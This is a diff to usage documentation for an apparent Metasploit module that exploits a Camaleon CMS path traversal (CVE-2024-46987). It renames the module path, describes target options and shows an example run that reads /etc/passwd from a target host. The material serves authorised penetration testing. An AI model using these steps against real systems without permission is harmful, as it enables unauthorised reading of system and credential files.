@@ -6,7 +6,7 @@ CVE-2024-46987 mistakenly indicates that versions 2.8.1 and 2.8.2 are also vulne
 
 ## Verification Steps
 
-1. Do: `use auxiliary/scanner/http/camaleon_traversal`
+1. Do: `use auxiliary/gather/camaleon_traversal`
 2. Do: `set RHOSTS [IP]`
 3. Do: `run`
 
@@ -26,11 +26,31 @@ The filepath of the file to read.
 
 ### depth
 
-The number of "../" appended to the filename. Default is 13.
+The number of "../" appended to the filename. Default is 13
+
+### targeturi
+
+The URI path of the Camaleon CMS admin page. Ex: /camaleon/admin
+
+Default is /admin
+
+### ssl
+
+If true, use HTTPS
+
+Default is false
+
+### rhost
+
+The target address.
+
+### rport
+
+The target port number.
 
 ### vhost
 
-Target virtual host/domain name.
+Target virtual host/domain name. Ex: target.com
 
 ### verbose
 
@@ -39,12 +59,12 @@ Get verbose output.
 ## Scenarios
 
 ```
-msf > use auxiliary/scanner/http/camaleon_traversal
-msf auxiliary(scanner/http/camaleon_traversal) > set rhost 10.0.0.45
+msf > use auxiliary/gather/camaleon_traversal
+msf auxiliary(gather/camaleon_traversal) > set rhost 10.0.0.45
 rhost => 10.0.0.45
-msf auxiliary(scanner/http/camaleon_traversal) > set rport 3000
+msf auxiliary(gather/camaleon_traversal) > set rport 3000
 rport => 3000
-msf auxiliary(scanner/http/camaleon_traversal) > run
+msf auxiliary(gather/camaleon_traversal) > run
 [*] Running for 10.0.0.45...
 [*] 10.0.0.45 -
 root:x:0:0:root:/root:/bin/bash
